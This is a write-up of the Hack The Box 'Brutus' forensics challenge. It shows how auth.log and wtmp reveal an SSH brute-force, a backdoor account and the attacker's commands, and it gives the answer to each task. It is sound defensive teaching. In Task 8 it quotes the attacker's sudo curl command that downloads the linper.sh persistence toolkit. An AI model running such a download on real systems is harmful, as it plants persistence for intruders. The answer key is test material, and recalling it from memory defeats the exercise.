# Brutus HTB

# Sherlock Scenario
> In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

# Task 1: Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

> auth.log is a system log file in Linux that records authentication and authorization events. It tracks activities related to users attempting to access the system and actions that require elevated privileges.
> The file is typically located at: ```/var/log/auth.log```



First, let's download and unzip the file:
```bash
7z x Brutus.htb
```

Let's open the auth.log file and take a look at what's inside.

```bash
cat auth.log
```

![catauth.png](/BrutusHTB/screenshots/catauth.png)

Since the attack is a brute-force login attempt, we can filter the ```auth.log``` file using keywords associated with authentication failures and SSH login attempts. Keywords such as ```authentication failure```, ```Failed password```, ```invalid user```, and ```Accepted password``` can be used to identify repeated login attempts and determine whether the attacker eventually gained access to the system.
Let's try one of them and see what happens:

```bash
grep "authentication failure" auth.log
```
![authfail.png](/BrutusHTB/screenshots/authfail.png)

Too many authentication failures from IP address ```65.2.161.68```, which answers our first task.

# Task 2: The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

Let's use the grep command with the keyword "Accepted password" to find successful login events:

```bash
grep "Accepted password" auth.log
```
![accepswd.png](/BrutusHTB/screenshots/accepswd.png)

Answer: ```root```

# Task 3: Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

## ```wtmp```, ```utmp``` and ```btmp``` background

> ```wtmp```: The ```wtmp``` file records all historical login and logout events on a Linux system. It tracks who logged in, from which terminal or IP, at what time, and for how long. This file is useful for reconstructing past user sessions and analyzing system access over time.

> ```utmp```: The ```utmp``` file keeps track of currently logged-in users. It shows active sessions on the system, including the username, terminal, and login time. Commands like ```who``` or ```w``` read this file to display live user activity.

> ```btmp```: The ```btmp``` file logs failed login attempts, making it an important source for detecting brute-force attacks or unauthorized access attempts. Using tools like ```lastb``` or a **parsing script**, we can see which usernames and IPs attempted unsuccessful logins.

In this task, we are searching for the second successful login by the attacker, since the first successful login resulted from a successful brute-force attack. Let's use the two files, ```wtmp``` and ```utmp.py```, that were provided along with the ```auth.log``` file, but before that we need to change the time in the ```utmp.py``` parser to UTC so that it correlates with ```auth.log```.

![toutc.png](/BrutusHTB/screenshots/toutc.png)

> UTC (Coordinated Universal Time) is the standard time reference used in many security logs, including ```auth.log```. Correlating events across different logs and systems is much more reliable when all timestamps are in UTC.


By modifying the timestamp conversion in ```utmp.py``` from ```time.localtime()``` to ```time.gmtime()```, all login and logout times are now displayed in UTC, providing a consistent reference for correlating events across logs. After parsing the ```wtmp``` file and filtering for ```root``` or ```USER``` entries corresponding to the attacker’s username and IP address, we can identify the manual login session, which represents when the attacker actually established a terminal session to interact with the system.

Now, let's use the ```utmp.py``` parser and the ```grep``` command to identify the manual session established by the attacker.

```bash
python3 utmp.py wtmp | grep "root"
OR
python3 utmp.py wtmp | grep "USER"
```
![result.png](/BrutusHTB/screenshots/result.png)

Answer: ```2024-03-06 06:32:45```

# Task 4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

| Event                   | Timestamp (UTC)     | User | Session |
| ----------------------- | ------------------- | ---- | ------- |
| First brute-force login | 2024-03-06 06:32:45 | root | 36      |
| Manual login (attacker) | 2024-03-06 06:37:35 | root | 37      |


Returning to the ```auth.log```, we can find the SSH session number after the attacker's second manual login with an accepted password. 

![sessionnumber1.png](/BrutusHTB/screenshots/sessionnumber1.png)

Answer: ```37```

# Task 5: The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

We can answer this question by searching the ```auth.log``` for some ```sudo``` commands:
```bash
grep "sudo" auth.log
```
![cyberjunkie.png](/BrutusHTB/screenshots/cyberjunkie.png)

Answer: ```cyberjunkie```

# Task 6: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

A simple Google search will provide us with the answer.

Answer: ```T1136.001```

# Task 7: What time did the attacker's first SSH session end according to auth.log?

Let's go back to the ```auth.log``` and search for keywords related to disconnecting or closing SSH sessions.
```bash
grep "root" auth.log | grep -i "Disconnect"
```
![disconnected.png](/BrutusHTB/screenshots/disconnected.png)

> Note: The first successful login by the attacker was the result of an automated brute force attempt, and the session was closed within the same second.

Answer: ```2024-03-06 06:37:24```

# Task 8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

Let's search the ```auth.log``` for suspicious commands that the attacker might have run to download scripts.

```bash
grep "cyberjunkie" auth.log | grep "sudo"
```

![attackercmd.png](/BrutusHTB/screenshots/attackercmd.png)

Answer: ```/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh```
